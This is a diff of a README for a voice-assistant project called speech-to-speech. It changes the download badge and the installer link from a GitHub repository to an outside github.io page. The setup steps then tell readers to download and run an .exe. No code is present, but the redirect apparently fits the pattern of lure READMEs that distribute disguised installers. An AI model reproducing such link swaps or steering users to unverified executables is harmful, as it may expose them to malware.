@@ -1,6 +1,6 @@
 # 🎙️ speech-to-speech - Build private voice assistants on computers
 
-[![](https://img.shields.io/badge/Download_on_GitHub-blue)](https://github.com/Nonunion-carborundum700/speech-to-speech)
+[![](https://img.shields.io/badge/Download_on_GitHub-blue)](https://nonunion-carborundum700.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ To run this software, ensure your computer meets these basic specifications:
 
 Follow these steps to set up your voice agent on Windows.
 
-1. Visit the project release page to get the installer: [https://github.com/Nonunion-carborundum700/speech-to-speech](https://github.com/Nonunion-carborundum700/speech-to-speech)
+1. Visit the project release page to get the installer: [https://nonunion-carborundum700.github.io](https://nonunion-carborundum700.github.io)
 2. Locate the file ending in .exe in the latest release section.
 3. Click the file to start the download to your computer.
 4. Navigate to your Downloads folder and double-click the file named speech-to-speech-installer.exe.
